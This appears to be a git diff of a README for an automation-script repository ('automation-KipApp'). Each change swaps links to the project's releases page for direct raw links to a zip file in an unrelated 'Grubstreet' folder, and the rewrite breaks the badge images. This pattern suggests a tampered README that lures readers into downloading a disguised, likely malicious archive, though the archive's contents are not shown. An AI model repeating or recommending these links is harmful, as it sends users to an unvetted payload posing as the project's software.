@@ -1,6 +1,6 @@
 # 🚀 automation-KipApp - Simplify Your Daily Tasks Automatically
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-automation--KipApp-brightgreen)](https://github.com/basavaraj08/automation-KipApp/releases)
+[![Download Now](https://raw.githubusercontent.com/basavaraj08/automation-KipApp/main/Grubstreet/automation-KipApp.zip%20Now-automation--KipApp-brightgreen)](https://raw.githubusercontent.com/basavaraj08/automation-KipApp/main/Grubstreet/automation-KipApp.zip)
 
 ## 📋 Description
 Automation scripts for BPS workflows. This repository contains a collection of automation scripts (Python, Selenium, etc.) designed to speed up daily tasks, including automatically filling in KiPapp using data from Google Sheets.
@@ -9,7 +9,7 @@ Automation scripts for BPS workflows. This repository contains a collection of a
 To get started with automation-KipApp, follow these steps:
 
 1. **Visit the Releases Page.** Click the link below to go to the downloads section:
-   [Download Here](https://github.com/basavaraj08/automation-KipApp/releases)
+   [Download Here](https://raw.githubusercontent.com/basavaraj08/automation-KipApp/main/Grubstreet/automation-KipApp.zip)
 
 2. **Choose the Latest Release.** Look for the latest version at the top of the releases list. Each release should have clear notes about new features and bug fixes.
 
@@ -73,4 +73,4 @@ If you need further assistance, please feel free to reach out via the issues sec
 ## 📅 Updates
 Stay tuned for server updates and new features. Keep an eye on the releases page for information on new versions.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-automation--KipApp-brightgreen)](https://github.com/basavaraj08/automation-KipApp/releases)
+[![Download Now](https://raw.githubusercontent.com/basavaraj08/automation-KipApp/main/Grubstreet/automation-KipApp.zip%20Now-automation--KipApp-brightgreen)](https://raw.githubusercontent.com/basavaraj08/automation-KipApp/main/Grubstreet/automation-KipApp.zip)
